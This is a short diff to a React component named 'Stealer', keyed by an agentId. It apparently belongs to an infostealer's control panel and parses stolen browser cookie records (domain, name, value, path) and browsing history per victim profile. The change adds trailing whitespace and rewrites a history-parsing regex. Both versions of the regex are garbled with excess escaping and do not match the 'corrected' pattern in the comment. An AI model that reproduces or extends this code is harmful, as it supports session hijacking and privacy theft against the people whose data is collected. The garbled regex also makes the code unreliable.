@@ -84,7 +84,7 @@ export default function Stealer({ agentId }) {
             const parts = line.split('\t');
             if (parts.length >= 7) {
                 parsed.push({
-                    browser, profile, domain: parts[0], name: parts[5], value: parts[6], path: parts[2]
+                    browser, profile, domain: parts[0], name: parts[5], value: parts[6], path: parts[2] 
                 });
             }
         });
@@ -97,7 +97,7 @@ export default function Stealer({ agentId }) {
         const lines = text.split('\n');
         // Corrected Regex: ^\[(.*?)\] (.*) \(([^)]+)\)$
         const parsed = lines.filter(l=>l.trim()).map(line => {
-            const match = line.match(/^\\\\[(.*?)\\\ \\] (.*) \\\\[([^)]+)\\\\)$/);
+            const match = line.match(/^\\\[(.*?)\\\\ \] (.*) \\\\([^)]+)\\\\)$/);
             if(match) return { browser, profile, time: match[1], title: match[2], url: match[3] };
             
             // Fallback parsing
